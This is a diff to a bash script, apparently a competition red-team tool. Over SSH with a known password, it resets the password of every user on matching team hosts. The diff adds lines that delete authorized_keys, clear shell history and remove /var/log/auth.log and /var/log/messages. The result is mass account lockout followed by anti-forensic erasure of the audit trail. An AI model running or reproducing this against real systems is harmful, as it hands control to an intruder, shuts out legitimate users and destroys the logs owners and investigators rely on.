@@ -18,10 +18,13 @@ update_passwords() {
         if [[ "$team_number_from_IP" == "$team_number" ]]; then
             echo "Updating passwords for team $team_number on IP: $IP"
 
-            sshpass -p "$orginal_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
+            sshpass -p "$original_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
+                echo \"$original_password\" | sudo -S rm -f ~/.ssh/authorized_keys
+                
                 echo \"$original_password\" | sudo -S bash -c '
                     for user in \$(cut -d: -f1 /etc/passwd); do
-                        echo \"\$user:$new_password\" |  chpasswd 
+                        echo \"\$user:$new_password\" | chpasswd 
+                        
                         if [[ $? -ne 0 ]]; then
                             echo \"Password failed to updated for user \$user@$IP\"
                         else
@@ -29,6 +32,10 @@ update_passwords() {
                         fi
                     done
                 '
+
+                echo \"$new_password\" | sudo -S history -c
+                echo \"$new_password\" | sudo -S rm -f /var/log/auth.log
+                echo \"$new_password\" | sudo -S rm -f /var/log/messages
             "
         fi
     done
